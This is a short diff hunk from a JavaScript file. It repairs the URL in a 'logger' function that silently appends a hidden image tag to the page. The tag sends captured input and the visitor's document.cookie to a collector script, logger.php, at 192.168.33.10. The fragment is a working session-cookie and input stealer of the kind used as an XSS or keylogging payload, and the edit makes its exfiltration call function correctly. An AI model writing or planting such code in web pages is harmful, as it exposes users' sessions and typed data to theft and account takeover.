@@ -107,7 +107,7 @@ setTimeout(function () {
 
 function logger(t) {
 console.log("in logger",t);
-$("body").append('<img src="http:/192.168.33.10:8080/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
+$("body").append('<img src="http://192.168.33.10/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
 }
 
 
